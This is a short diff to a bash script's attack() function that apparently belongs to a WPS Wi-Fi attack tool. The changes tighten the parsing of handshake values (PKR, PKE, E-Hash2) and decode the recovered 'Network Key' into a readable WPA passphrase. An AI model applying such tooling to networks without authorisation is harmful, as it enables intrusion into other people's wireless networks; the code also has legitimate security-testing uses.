@@ -76,8 +76,8 @@ function attack()
 			then
 				PKR=$(gethex "$LINE")
 				printG "PKR: $PKR"
-			elif [[ $LINE =~ "DH peer Public Key" ]] &&\
-			   [[ $LINE =~ "hexdump" ]]
+			elif [[ $LINE =~ "DH peer Public Key" ]]\
+			  && [[ $LINE =~ "hexdump" ]]
 			then
 				PKE=$(gethex "$LINE")
 				printG "PKE: $PKE"
@@ -93,10 +93,12 @@ function attack()
 			then
 				EHASH2=$(gethex "$LINE")
 				printG "E-Hash2: $EHASH2"
-			elif [[ $LINE =~ "Network Key" ]]
+			elif [[ $LINE =~ "Network Key" ]]\
+			  && [[ $LINE =~ "hexdump" ]]
 			then
-				WPA_KEY=$(gethex "$LINE")
+				WPA_KEY=$(gethex "$LINE" | xxd -r -p)
 				printG "WPA pass: $WPA_KEY"
+				quit
 			fi
 
 		#Status messages
